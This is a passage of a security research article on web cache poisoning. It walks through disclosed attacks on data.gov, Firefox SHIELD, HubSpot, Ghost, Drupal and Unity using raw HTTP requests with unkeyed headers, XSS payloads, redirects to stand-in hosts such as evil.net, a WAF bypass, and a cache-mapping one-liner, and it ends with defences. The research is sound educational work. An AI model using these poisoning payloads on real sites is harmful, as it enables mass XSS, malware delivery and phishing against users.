HTTP/1.1<br>Host: id.burpcollaborator.net</code><p>The path suggests that somewhere on the website, there's JavaScript code using the data-site-root attribute to decide where to load some internationalisation data from. I attempted to find out what this data ought to look like by fetching https://catalog.data.gov/api/i18n/en, but merely received an empty JSON response. Fortunately, changing 'en' to 'es' gave a clue:</p><code>GET /api/i18n/es HTTP/1.1<br>Host: catalog.data.gov<br><br>HTTP/1.1 200 OK<br>…<br>{"Show more":"Mostrar más"}</code><p>The file contains a map for translating phrases into the user's selected language. By creating our own translation file and using cache poisoning to point users toward that, we could translate phrases into exploits:</p><code>GET&nbsp; /api/i18n/en HTTP/1.1<br>Host: portswigger-labs.net<br><br>HTTP/1.1 200 OK<br>...<br>{"Show more":"&lt;svg onload=alert(1)&gt;"}</code><p>The end result? Anyone who viewed a page containing the text 'Show more' would get exploited.</p><h3 id="hijackingmozillashield">Hijacking Mozilla SHIELD</h3><p>The 'X-Forwarded-Host' match/replace rule I configured to help with the last vulnerability had an unexpected side effect. In addition to the interactions from catalog.data.gov, I received some that were distinctly mysterious:</p><code>GET /api/v1/recipe/signed/ HTTP/1.1<br>Host: xyz.burpcollaborator.net<br>User-Agent: Mozilla/5.0 … Firefox/57.0<br>Accept: application/json<br>origin: null<br>X-Forwarded-Host: xyz.burpcollaborator.net</code><p> I had previously encountered the 'null' origin in my <a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank">CORS vulnerability research</a>, but&nbsp;I'd never seen a browser issue a fully lowercase Origin header before. Sifting through proxy history logs revealed that the culprit was Firefox itself. Firefox had tried to fetch a list of 'recipes' as part of its <a href="https://wiki.mozilla.org/Firefox/Shield">SHIELD</a> system for silently installing extensions for marketing and research purposes. This system is probably best known for forcibly distributing a 'Mr Robot' extension, causing considerable <a href="https://www.cnet.com/news/mozilla-backpedals-after-mr-robot-firefox-misstep/">consumer backlash</a>. </p><p>Anyway, it looked like the X-Forwarded-Host header had fooled this system into directing Firefox to my own website in order to fetch recipes:</p><code>GET /api/v1/ HTTP/1.1<br>Host: normandy.cdn.mozilla.net<br>X-Forwarded-Host: xyz.burpcollaborator.net<br><br>HTTP/1.1 200 OK<br>{<br>&nbsp; "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",<br>&nbsp; "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",<br>&nbsp; "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",<br>&nbsp; "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",<br>&nbsp;  …<br>}</code><p>Recipes look something like:</p><code>[{<br>&nbsp; "id": 403,<br>&nbsp; "last_updated": "2017-12-15T02:05:13.006390Z",<br>&nbsp; "name": "Looking Glass (take 2)",<br>&nbsp; "action": "opt-out-study",<br>&nbsp; "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",<br>&nbsp; "filter_expression": "normandy.country in&nbsp; ['US', 'CA']\n &amp;&amp; normandy.version &gt;= '57.0'\n)",<br>&nbsp; "description": "MY REALITY IS JUST DIFFERENT THAN YOURS",<br>}]</code><p>This system was using NGINX for caching, which was naturally happy to save my poisoned response and serve it to other users. Firefox fetches this URL shortly after the browser is opened and also periodically refetches it, ultimately meaning all of Firefox's tens of millions of daily users could end up retrieving recipes from my website. </p><p>This offered quite a few possibilities. The recipes used by Firefox were <a href="https://github.com/mozilla-services/autograph/tree/master/signer/contentsignature">signed</a> so I couldn't just install a malicious addon and get full code execution, but I could direct tens of millions of genuine users to a URL of my choice. Aside from the obvious DDoS usage, this would be extremely serious if combined with an appropriate memory corruption vulnerability. Also, some backend Mozilla systems use unsigned recipes, which could potentially be used to obtain a foothold deep inside their infrastructure and perhaps obtain the recipe-signing key. Furthermore, I could replay old recipes of my choice which could potentially force mass installation of an old known-vulnerable extension, or the unexpected return of Mr Robot.</p><p>I reported this to Mozilla and they patched their infrastructure in under 24 hours but there was some disagreement about the severity so it was only rewarded with a $1,000 bounty. </p><h3 id="routepoisoning">Route poisoning</h3><p>Some applications go beyond foolishly using headers to generate URLs, and foolishly use them for internal request routing:</p><code>GET / HTTP/1.1<br>Host: www.goodhire.com<br>X-Forwarded-Server: canary<br><br>HTTP/1.1 404 Not Found<br>CF-Cache-Status: MISS<br>…<br>&lt;title&gt;HubSpot - Page not found&lt;/title&gt;<br>&lt;p&gt;The domain canary does not exist in our system.&lt;/p&gt;</code><p> Goodhire.com is evidently hosted on HubSpot, and HubSpot is giving the X-Forwarded-Server header priority over the Host header and getting confused about which client this request is intended for. Although our input is reflected in the page, it's HTML encoded so a straightforward XSS attack doesn't work here. To exploit this, we need to go to hubspot.com, register ourselves as a HubSpot client, place a payload on our HubSpot page, and then finally trick HubSpot into serving this response on goodhire.com: </p><code>GET / HTTP/1.1<br>Host: www.goodhire.com<br>X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com<br><br>HTTP/1.1 200 OK<br>…<br>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><p>Cloudflare happily cached this response and served it to subsequent visitors. </p><p id="hubspotpatch">Inflection passed this report on to HubSpot, who appeared to try and resolve the issue by permanently banning my IP address. A while later, the vulnerability was patched. After the publication of this post, HubSpot reached out to state that they never received the report from Inflection (so both the IP ban and patch were standard defence and hardening measures) and that I'd have had a better experience if I had contacted&nbsp;their <a href="https://bugcrowd.com/hubspot" target="_blank">own disclosure program</a>&nbsp;directly. If nothing else, this serves to highlight the hazards of reporting vulnerabilities via third parties.</p><p>Internal misrouting vulnerabilities like this are on particularly common on SaaS applications where there's a single system handling requests intended for many different customers.<br></p><h3 id="hiddenroutepoisoning">Hidden Route Poisoning</h3><p>Route poisoning vulnerabilities aren't always quite so obvious:</p><code>GET / HTTP/1.1<br>Host: blog.cloudflare.com<br>X-Forwarded-Host: canary<br><br>HTTP/1.1 302 Found<br>Location: https://ghost.org/fail/ </code><p>Cloudflare's blog is hosted by Ghost, who are clearly doing something with the X-Forwarded-Host header. You can avoid the 'fail' redirect by specifying another recognized hostname like blog.binary.com, but this simply results in a mysterious 10 second delay followed by the standard blog.cloudflare.com response. At first glance there's no clear way to exploit this.</p><p>When a user first registers a blog with Ghost, it issues them with a unique subdomain under ghost.io. Once a blog is up and running, the user can define an arbitrary custom domain like blog.cloudflare.com. If a user has defined a custom domain, their ghost.io subdomain will simply redirect to it: </p><code>GET / HTTP/1.1<br>Host: noshandnibble.ghost.io<br><br>HTTP/1.1 302 Found<br>Location: http://noshandnibble.blog/</code><p>Crucially, this redirect can also be triggered using the X-Forwarded-Host header:</p><code>GET / HTTP/1.1<br>Host: blog.cloudflare.com<br>X-Forwarded-Host: noshandnibble.ghost.io<br><br>HTTP/1.1 302 Found<br>Location: http://noshandnibble.blog/</code><p> By registering my own ghost.org account and setting up a custom domain, I could redirect requests sent to blog.cloudflare.com to my own site (now expired): wafproxy.net. This meant I could hijack resource loads like images: </p><p class="text-center"><img src="/cms/images/38/8b/c60d1ff4bc9d-article-cloudflareimage.png" height="400"></p><p>The next logical step of redirecting a JavaScript load to gain full control over blog.cloudflare.com was thwarted by a quirk – if you look closely at the redirect, you'll see it uses HTTP whereas the blog is loaded over HTTPS. This means that browsers' mixed-content protections kick in and block script/stylesheet redirections. </p><p> I couldn't find any technical way to make Ghost issue a HTTPS redirect, and was tempted to abandon my scruples and report the use of HTTP rather than HTTPS to Ghost as a vulnerability in the hope that they'd fix it for me. Eventually I decided to crowdsource a solution by making a replica of the problem and placing it in <a href="https://hackxor.net/mission?id=7">hackxor</a> with a cash prize attached. The first solution was found by Sajjad Hashemian, who spotted that in Safari if wafproxy.net was in the browser's HSTS cache the redirect would be automatically upgraded to HTTPS rather than being blocked. <a href="https://twitter.com/_s_n_t">Sam Thomas</a> followed up with a solution for Edge, based on <a href="https://www.brokenbrowser.com/loading-insecure-content-in-secure-pages/">work by Manuel Caballero</a> – issuing a 302 redirect to a HTTPS URL completely bypasses Edge's mixed-content protection. </p><p> In total, against Safari and Edge users I could completely compromise every page on blog.cloudflare.com, blog.binary.com, and every other ghost.org client. Against Chrome/Firefox users, I could merely hijack images. Although I used Cloudflare for the screenshot above, as this was an issue in a third party system I choose to report it via Binary because their bug bounty program pays cash, unlike Cloudflare's. </p><h3 id="chainingunkeyedinputs">Chaining Unkeyed Inputs</h3><p> Sometimes an unkeyed input will only confuse part of the application stack, and you'll need to chain in other unkeyed inputs to achieve an exploitable result. Take the following site:</p><code>GET /en HTTP/1.1<br>Host: redacted.net<br>X-Forwarded-Host: xyz<br><br>HTTP/1.1 200 OK<br>Set-Cookie: locale=en; domain=xyz</code><p> The X-Forwarded-Host header overrides the domain on the cookie, but none of the URLs generated in the rest of the response. By itself this is useless. However, there's another unkeyed input: </p><code>GET /en HTTP/1.1<br>Host: redacted.net<br>X-Forwarded-Scheme: nothttps<br><br>HTTP/1.1 301 Moved Permanently<br>Location: https://redacted.net/en</code><p>This input is also useless by itself, but if we combine the two together we can convert the response into a redirect to an arbitrary domain:</p><code>GET /en HTTP/1.1<br>Host: redacted.net<br>X-Forwarded-Host: attacker.com<br>X-Forwarded-Scheme: nothttps<br><br>HTTP/1.1 301 Moved Permanently<br>Location: https://attacker.com/en </code><p> Using this technique it was possible to steal <a href="/web-security/csrf">CSRF</a> tokens from a custom HTTP header by redirecting a POST request. I could also obtain stored <a href="/web-security/cross-site-scripting/dom-based">DOM-based XSS</a> with a malicious response to a JSON load, similar to the data.gov exploit mentioned earlier. </p><h3 id="opengraphhijacking">Open Graph Hijacking</h3><p> On another site, the unkeyed input exclusively affected Open Graph URLs: </p><code>GET /en HTTP/1.1<br>Host: redacted.net<br>X-Forwarded-Host: attacker.com<br><br>HTTP/1.1 200 OK<br>Cache-Control: max-age=0, private, must-revalidate<br>…<br>&lt;meta property="og:url" content='https://attacker.com/en'/&gt;</code><p> <a href="http://ogp.me/">Open Graph</a> is a protocol created by Facebook to let website owners dictate what happens when their content is shared on social media. The og:url parameter we've hijacked here effectively overrides the URL that gets shared, so anyone who shares the poisoned page actually ends up sharing content of our choice. </p><p> As you may have noticed, the application sets 'Cache-Control: private', and Cloudflare refuse to cache such responses. Fortunately, other pages on the site explicitly enable caching: </p><code>GET /popularPage HTTP/1.1<br>Host: redacted.net<br>X-Forwarded-Host: evil.com<br><br>HTTP/1.1 200 OK<br>Cache-Control: public, max-age=14400<br>Set-Cookie: session_id=942…<br>CF-Cache-Status: MISS</code><p> The 'CF-Cache-Status' header here is an indicator that Cloudflare is considering caching this response, but in spite of this the response was never actually cached. I speculated that Cloudflare's refusal to cache this might be related to the session_id cookie, and retried with that cookie present: </p><code>GET /popularPage HTTP/1.1<br>Host: redacted.net<br>Cookie: session_id=942…;<br>X-Forwarded-Host: attacker.com<br><br>HTTP/1.1 200 OK<br>Cache-Control: public, max-age=14400<br>CF-Cache-Status: HIT<br>…<br>&lt;meta property="og:url" <br>content='https://attacker.com/…</code><p>This finally got the response cached, although it later turned out that I could have skipped the guesswork and read <a href="https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/">Cloudflare's cache documentation</a> instead.</p><p>In spite of the response being cached, the 'Share' result still remained unpoisoned; Facebook evidently wasn't hitting the particular Cloudflare cache that I'd poisoned. To identify which cache I needed to poison, I took advantage of a helpful debugging feature present on all Cloudflare sites - /cdn-cgi/trace: </p><p> </p><p class="text-center"><img src="/cms/images/c8/7c/6846e4bc6c75-article-cloudfacebooktrace2.jpg.png"></p><p>Here, the colo=AMS line shows that Facebook has accessed wafproxy.net through a cache in Amsterdam. The target website was accessed via Atlanta, so I rented a $2/month VPS there and attempted the poisoning again: </p><img src="/cms/images/cb/6e/483a36392ba0-article-atlanta.png"><p>After this, anyone who attempted to share various pages on their site would end up sharing content of my choice. Here's a heavily redacted video of the attack:</p><video id="opengraphdemo" src="/cms/videos/49/7c/9ace115de5b2-opengraph.mp4" controls="controls">Video tags are not supported by your browser.</video><h3 id="localroutepoisoning">Local Route Poisoning</h3><p> So far we've seen a cookie-based language hijack, and a plague of attacks that use various headers override the host. At this point in the research I had also found a few variations using bizarre non-standard headers such as 'translate', 'bucket' and 'path_info', and suspected I was missing many others. My next major advancement came after I expanded the header wordlist by downloading and scouring the top 20,000 PHP projects on GitHub for header names. </p><p> This revealed the headers X-Original-URL and X-Rewrite-URL which override the request's path. I first noticed them affecting targets running Drupal, and digging through Drupal's code revealed that the support for this header comes from the popular PHP framework Symfony, which in turn took the code from Zend. The end result is that a huge number of PHP applications unwittingly support these headers. Before we try using these headers for cache poisoning, I should point out they're also great for bypassing WAFs and security rules: </p><code>GET /admin HTTP/1.1<br>Host: unity.com<br><br><br>HTTP/1.1 403 Forbidden<br>...<br>Access is denied</code><code>GET /anything HTTP/1.1<br>Host: unity.com<br>X-Original-URL: /admin<br><br>HTTP/1.1 200 OK<br>...<br>Please log in</code><p>If an application uses a cache, these headers can be abused to confuse it into serving up incorrect pages. For example, this request has a cache key of /education?x=y but retrieves content from /gambling?x=y:</p><img src="/cms/images/7b/46/0dc96adf39de-article-cache-busting-1.svg"><p>The end result is that after sending this request, anyone who tries to access the Unity for education page gets a surprise:</p><p class="text-center"><img src="/cms/images/36/ff/73c660a4bcf4-article-unitymaybe.png" height="400"></p><p>The ability to swap around pages is more amusing than serious, but perhaps it has a place in a bigger exploit chain. </p><h3 id="internalcachepoisoning">Internal Cache Poisoning</h3><p>Drupal is often used with third party caches like Varnish, but it also contains an internal cache which is enabled by default. This cache is aware of the X-Original-URL header and includes it in its cache key, but makes the mistake of also including the query string from this header: </p><p>  </p><p><img src="/cms/images/6c/c2/0148b0dd31eb-article-cache-busting-2.svg"><br></p><p>While the previous attack let us replace a path with another path, this one lets us override the query string:</p><code>GET /search/node?keys=kittens HTTP/1.1<br><br>HTTP/1.1 200 OK<br>…<br>Search results for 'snuff'</code><p>This is more promising, but it's still quite limited – we need a third ingredient.</p><h3 id="drupalopenredirect">Drupal Open Redirect</h3><p> While reading Drupal's URL-override code, I noticed an extremely risky feature – on all redirect responses, you can override the redirect target using the 'destination' query parameter. Drupal attempts some URL parsing to ensure it won't redirect to an external domain, but this is predictably easy to bypass: </p><code>GET <span class="orange">//</span>?destination=https://evil.net\@unity.com/ HTTP/1.1<br>Host: unity.com<br><br>HTTP/1.1 302 Found<br>Location: https://evil.net<span class="orange">\</span>@unity.com/</code><p>Drupal sees the double-slash // in the path and tries to issue a redirect to / to normalize it, but then the destination parameter kicks in. Drupal thinks the destination URL is telling people to access unity.com with the username 'evil.net\' but in practice web browsers automatically convert the \ to /, landing users on evil.net/@unity.com. </p><p>Once again, by itself an open redirect is hardly exciting, but now we finally have all the building blocks for a serious exploit.</p><h3 id="chainedcachepoisoning">Persistent redirect hijacking</h3><p>We can combine the parameter override attack with the open redirect to persistently hijack any redirect. Certain pages on Pinterest's business website happen to import JavaScript via a redirect. The following request poisons the cache entry shown in blue with the parameter shown in orange:</p><code>GET /?<span class="orange">destination=https://evil.net\@business.pinterest.com/</span> HTTP/1.1<br>Host: business.pinterest.com<br>X-Original-URL: <span class="blue">/foo.js?v=1</span></code><p>This hijacks the destination of the JavaScript import, giving me full control of several pages on business.pinterest.com that are supposed to be static:</p><code>GET /foo.js?v=1 HTTP/1.1<br><br>HTTP/1.1 302 Found<br>Location: https://evil.net\@unity.com/</code><h3 id="nestedcachepoisoning">Nested cache poisoning</h3><p> Other Drupal sites are less obliging, and don't import any important resources via redirects. Fortunately, if the site uses an external cache (like virtually all high-traffic Drupal sites) we can use the internal cache to poison the external cache, and in the process convert any response into a redirection. This is a two-stage attack. First, we poison the internal cache to replace /redir with our malicious redirect:</p><code>GET /<span class="orange">?destination=https://evil.net\@store.unity.com/</span> HTTP/1.1<br>Host: store.unity.com<br>X-Original-URL: <span class="blue">/redir</span></code><p>Next, we poison the external cache to replace /download?v=1 with our pre-poisoned /redir:</p><code>GET <span class="blue">/download?v=1</span> HTTP/1.1<br>Host: store.unity.com<br>X-Original-URL: <span class="orange">/redir</span></code><p> The end result is that clicking 'Download installer' on unity.com would download some opportunistic malware from evil.net. This technique could also be used for a wealth of other attacks including inserting spoofed entries into RSS feeds, replacing login pages with phishing pages, and <a href="/web-security/cross-site-scripting/stored">stored XSS</a> via dynamic script imports. </p><p>Here's a a video of one such attack on a stock Drupal installation:</p><video id="drupaldemo" src="/cms/videos/5b/fe/e952b9f0eb55-drupaldemo.mp4" controls="controls">Video tags are not supported by your browser.</video><p>This vulnerability was disclosed to the Drupal, Symfony and Zend teams on 2018-05-29, and support for these headers has was disabled via a coordinated patch release on 2018-08-01 with the following references: <a href="https://www.drupal.org/SA-CORE-2018-005" target="_blank">SA-CORE-2018-005</a>, <a href="https://symfony.com/blog/cve-2018-14773-remove-support-for-legacy-and-risky-http-headers" target="_blank">CVE-2018-14773</a>, <a href="https://framework.zend.com/security/advisory/ZF2018-01" target="_blank">ZF2018-01</a>.</p><h2 id="crosscloudpoisoning">Cross-Cloud Poisoning</h2><p>As you could probably have guessed, some of these vulnerability reports triggered interesting reactions and responses. </p><p>One triager, scoring my submission using CVSS, gave a CloudFront cache poisoning report an access complexity of 'high' because an attacker might need to rent several VPSs in order to poison all CloudFront's caches. Resisting the temptation to argue about what constitutes 'high' complexity, I took this as an opportunity to explore whether cross-region attacks are possible without relying on VPSs. </p><p>It turned out that CloudFront have a helpful map of their caches, and their IP addresses can be easily identified using <a href="https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&amp;t=A">free online services</a> that issue DNS lookups from a range of geographical locations. Poisoning a specific region from the comfort of your bedroom is as simple as routing your attack to one of these IPs using curl/Burp's host-name override features.</p><p>As Cloudflare have even more regional caches, I decided to take a look at them too. Cloudflare publish a list of all their IP addresses online, so I wrote a quick script to request wafproxy.net/cgn-cgi/trace through each of these IPs and record which cache I hit:</p><code>curl https://www.cloudflare.com/ips-v4 | sudo zmap -p80| zgrab --port 80 --data traceReq | fgrep visit_scheme | jq -c '[.ip , .data.read]' cf80scheme | sed -E 's/\["([0-9.]*)".*colo=([A-Z]+).*/\1 \2/' | awk -F " " '!x[$2]++'</code><p> This showed that when targeting wafproxy.net (which is hosted in Ireland) I could hit the following caches from my home in Manchester: </p><code>104.28.19.112 LHR&nbsp; &nbsp; 172.64.13.163 EWR&nbsp; &nbsp; 198.41.212.78 AMS<br>172.64.47.124 DME&nbsp; &nbsp; 172.64.32.99 SIN&nbsp; &nbsp;  108.162.253.199 MSP<br>172.64.9.230 IAD&nbsp; &nbsp;  198.41.238.27 AKL&nbsp; &nbsp; 162.158.145.197 YVR</code><h2 id="replicating">The common pitfall</h2><p>As of 2021, the most common question I recieve on this research is from people who have found that they can replicate a cache poisoning vulnerability using Burp Repeater or a proxied browser, but not in an unproxied browser. This occurs when the request your browser and Burp are issuing is slightly different, and the difference is in a keyed part of the request.</p><p>To identify the difference, compare the request shown in your browser's developer console, and the request logged in Logger++. The two most common causes are:</p><ul><li>Param Miner has 'Add fcbz cachebuster' enabled, which adds a static query parameter to Burp's requests</li><li>The server has included the 'Accept-Encoding' header in the cache key. In Burp Suite, the 'Proxy&gt;Options&gt;Remove unsupported encodings' option rewrites this header.</li></ul><p>Both of these scenarios can be easily resolved by tweaking the poison request to ensure the cache keys match.</p>&nbsp;<h2 id="defense">Defense</h2><p>The most robust defense against cache poisoning is to disable caching. This is plainly unrealistic advice for some, but I suspect that quite a few websites start using a service like Cloudflare for DDoS protection or easy SSL, and end up vulnerable to cache poisoning simply because caching is enabled by default.</p><p>Restricting caching to purely static responses is also effective, provided you're sufficiently wary about what you define as 'static'.</p><p>Likewise, avoiding taking input from headers and cookies is an effective way to prevent cache poisoning, but it's hard to know if other layers and frameworks are sneaking in support for extra headers. As such I recommend auditing every page of your application with Param Miner to flush out unkeyed inputs.</p><p>Once you've identified unkeyed inputs in your application, the ideal solution is to outright disable them. Failing that, you could strip the inputs at the cache layer, or add them to the cache key. Some caches let you use the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary">Vary header</a> to key unkeyed inputs, and others let you define custom cache keys but may restrict this feature to 'enterprise' customers. </p><p>Finally, regardless of whether your application has a cache, some of your clients may have a cache at their end and as such client-side vulnerabilities like XSS in HTTP headers should never be ignored. </p><h2 id="conclusion">Conclusion</h2><p> Web cache poisoning is far from a theoretical vulnerability, and bloated applications and towering server stacks are conspiring to take it to the masses. We've seen that even well-known frameworks can hide dangerous omnipresent features, confirming it's never safe to assume that someone else has read the source code just because it's open-source and has millions of users. We've also seen how placing a cache in front of a website can take it from completely secure to critically vulnerable. I think this is part of a greater trend where as websites become increasingly nestled inside helper systems, their security posture is increasingly difficult to adequately assess in isolation. </p><p>Finally, I've built a little <a href="https://hackxor.net/mission?id=8">challenge</a> for people to test their knowledge, and look forward to seeing where other researchers take web cache poisoning in future.</p><h3>2020 update</h3><p>You can find further research on this topic in my followup posts&nbsp;<a href="https://portswigger.net/blog/bypassing-web-cache-poisoning-countermeasures">Bypassing Web Cache Poisoning Countermeasures</a>&nbsp;and <a href="https://portswigger.net/research/web-cache-entanglement" target="_blank">Web Cache Entanglement: Novel Pathways to Poisoning</a>.</p><p>Also, we have released a collection of free, interactive labs so you can <a href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank">try out web cache poisoning for yourself</a> as part of our Web Security Academy:</p><a href="https://portswigger.net/web-security/web-cache-poisoning" class="link-banner-small-white"><span class="icon-erlenmeyer"></span><span><p>LAB</p><p>Web cache poisoning labs</p></span></a>
+    <div class="container-flex-wrap">
+            <a class="label-rounded-outline-white" href="/research/web-cache-poisoning">
+                web cache poisoning
+            </a>
+            <a class="label-rounded-outline-white" href="/research/james-kettle">
+                James Favourites
+            </a>
+            <a class="label-rounded-outline-white" href="/research/presentations">
+                Presentations
+            </a>
+            <a class="label-rounded-outline-white" href="/research/black-hat">
+                Black Hat
+            </a>
+    </div>
+    <p><a href="/research/articles" class="chevron-before">Back to all articles</a></p>
+</div>
+
+    <div class="section-light section-full-width theme-grey-5">
+        <noscript>
+    <div class="noscript-warning">This page requires JavaScript for an enhanced user experience.</div>
+</noscript>
+        <h2 class="text-center">Related Research</h2>
+        
+<div class="widget-tile-container margin-top-m">
+
+
+<a href="/research/css-the-bomb-inside-your-inbox" class="tile-container research onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl=/cms/images/0e/fe/eb24-tile-tile1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+CSS:the bomb inside your inbox</h3>
+    
+<span class="tile-date">06 August 2026</span>
+    
+<span class="tile-text1-alt">CSS:the bomb inside your inbox</span>
+        
+
+</a>
+
+<a href="/research/crlf-powered-desync-attacks" class="tile-container research onecolumn widget-tile size0 style1 textstyle8 is-whitebackground" data-backgroundimageurl=/cms/images/14/fe/c5f2-tile-preview.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+        <span class="tile-text-container">CRLF-Powered Desync Attacks: Beheading HTTP Streams</span>
+</h3>
+    
+<span class="tile-date">05 August 2026</span>
+    
+<span class="tile-text1-alt">CRLF-Powered Desync Attacks: Beheading HTTP Streams</span>
+        
+
+</a>
+
+<a href="/research/can-ai-do-novel-security-research" class="tile-container research onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl=/cms/images/e3/7c/bf70-tile-http_terminator_1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+Can AI do novel security research? Meet the HTTP Terminator</h3>
+    
+<span class="tile-date">05 August 2026</span>
+    
+<span class="tile-text1-alt">Can AI do novel security research? Meet the HTTP Terminator</span>
+        
+
+</a>
+
+<a href="/research/the-fragile-lock" class="tile-container research onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl=/cms/images/3d/5b/62c1-tile-fragile-lock-1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 ">
+The Fragile Lock:</h3>
+
+
+    <span class="tile-text2">
+Novel Bypasses For SAML Authentication    </span>
+    
+<span class="tile-date">10 December 2025</span>
+    
+<span class="tile-text1-alt">The Fragile Lock:</span>
+        
+        <span class="tile-text2-alt">Novel Bypasses For SAML Authentication</span>
+
+</a></div>
+
+
+    </div>
+
+
+
+<script type="application/ld&#x2B;json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "@type": "Person",
+    "name": "James Kettle"
+  },
+  "dateModified": "2025-09-03",
+  "datePublished": "2018-08-09",
+  "headline": "Practical Web Cache Poisoning",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://portswigger.net/research/practical-web-cache-poisoning"
+  },
+  "image":{
+    "@type": "ImageObject",
+    "url": "https://portswigger.net/cms/images/d0/43/5e5ed09ea718-twittercard-cache-poisoning-article.png"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://portswigger.net/content/images/logos/thumbnail.png"
+    },
+    "name": "PortSwigger Research",
+    "url": "https://portswigger.net/research",
+    "sameAs": [
+      "https://twitter.com/portswiggerres"
+    ]
+  },
+  "url": "https://portswigger.net/research/practical-web-cache-poisoning"
+}
+</script>
+
+<script src="/bundles/cms/research/details.js?v=BE1g-bqV17iCwvzZzBCK3Ni1CVA" nonce="l7kHb7x1uPMxhM0kvUViM6LhCSniwufz"></script>
+
+        </div>
+        <footer class="wrapper">
+    <div class="container">
+        <div>
+            <p>Burp Suite</p>
+            <a href="/burp/vulnerability-scanner">Web vulnerability scanner</a>
+            <a href="/burp">Burp Suite Editions</a>
+            <a href="/burp/releases">Release Notes</a>
+        </div>
+        <div>
+            <p>Vulnerabilities</p>
+            <a href="/web-security/cross-site-scripting">Cross-site scripting (XSS)</a>
+            <a href="/web-security/sql-injection">SQL injection</a>
+            <a href="/web-security/csrf">Cross-site request forgery</a>
+            <a href="/web-security/xxe">XML external entity injection</a>
+            <a href="/web-security/file-path-traversal">Directory traversal</a>
+            <a href="/web-security/ssrf">Server-side request forgery</a>
+        </div>
+        <div>
+            <p>Customers</p>
+            <a href="/organizations">Organizations</a>
+            <a href="/testers">Testers</a>
+            <a href="/developers">Developers</a>
+        </div>
+        <div>
+            <p>Company</p>
+            <a href="/about">About</a>
+            <a href="/careers">Careers</a>
+            <a href="/about/contact">Contact</a>
+            <a href="/legal">Legal</a>
+            <a href="/privacy">Privacy Notice</a>
+            <a href="/modern-slavery-statement">Modern Slavery Statement</a>
+        </div>
+        <div>
+            <p>Insights</p>
+            <a href="/web-security">Web Security Academy</a>
+            <a href="/blog">Blog</a>
+            <a href="/research">Research</a>
+            <a href="/engineering">Engineering</a>
+        </div>
+        <div>
+            <a href="/"><img src="/content/images/logos/portswigger-logo.svg" alt="PortSwigger Logo" class="footer-logo"></a>
+            <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span class="icon-twitter"></span>  Follow us</a>
+            <p class="grey">&copy; 2026 PortSwigger Ltd.</p>
+        </div>
+    </div>
+</footer>
+<a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63" /><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63" /></svg></a>
+
+        <a class="back-to-top" href="#top">
+            <svg height="26" viewBox="0 0 26 26" width="26" xmlns="http://www.w3.org/2000/svg">
+                <polygon fill="#f63" points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7"></polygon>
+                <path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63"></path>
+            </svg>
+        </a>
+    </body>
+</html>
